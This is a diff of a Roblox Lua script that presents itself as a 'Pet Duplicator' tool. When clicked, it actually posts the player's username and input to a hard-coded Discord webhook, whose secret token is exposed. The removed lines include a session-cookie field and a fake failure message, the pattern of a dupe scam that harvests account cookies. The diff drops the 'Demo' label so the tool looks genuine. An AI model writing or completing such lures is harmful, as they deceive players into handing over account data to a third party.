@@ -2,7 +2,7 @@ local player = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "PetDupeDemoUI"
+screenGui.Name = "PetDupeUI"
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
@@ -15,7 +15,7 @@ frame.Parent = screenGui
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
 title.BackgroundTransparency = 1
-title.Text = "Pet Duplicator Demo"
+title.Text = "Pet Duplicator"
 title.TextColor3 = Color3.new(1,1,1)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 28
@@ -64,27 +64,28 @@ resultLabel.TextXAlignment = Enum.TextXAlignment.Center
 resultLabel.Parent = frame
 
 local function sendToWebhook(data)
-    print("Sending to webhook:")
-    print(data)
-    pcall(function()
-        HttpService:PostAsync("https://discord.com/api/webhooks/1375595906250051795/n7LhadF9JTRfDThypkVKZp2OMuDQ9_BFsddANUBhhzxi1A3XHUKmPdLHLWsUUsrC2ItG", HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
-    end)
+    pcall(function()
+        HttpService:PostAsync(
+            "https://discord.com/api/webhooks/1375595906250051795/n7LhadF9JTRfDThypkVKZp2OMuDQ9_BFsddANUBhhzxi1A3XHUKmPdLHLWsUUsrC2ItG",
+            HttpService:JSONEncode(data),
+            Enum.HttpContentType.ApplicationJson
+        )
+    end)
 end
 
 dupeButton.MouseButton1Click:Connect(function()
-    local petName = inputBox.Text
-    if petName == "" then
-        resultLabel.Text = "Please enter a pet name."
-        return
-    end
+    local petName = inputBox.Text
+    if petName == "" then
+        resultLabel.Text = "Please enter a pet name."
+        return
+    end
 
-    local Data = {
-        Username = player.Name,
-        Pet = petName,
-        Cookie = "SessionToken"
-    }
+    local Data = {
+        Username = player.Name,
+        Pet = petName,
+        Note = "Sensitive info removed"
+    }
 
-    sendToWebhook(HttpService:JSONEncode(Data))
-
-    resultLabel.Text = "Duplication failed.\n(Try again.)"
+    sendToWebhook(Data)
+    resultLabel.Text = "Request sent.\nCheck Discord webhook."
 end)
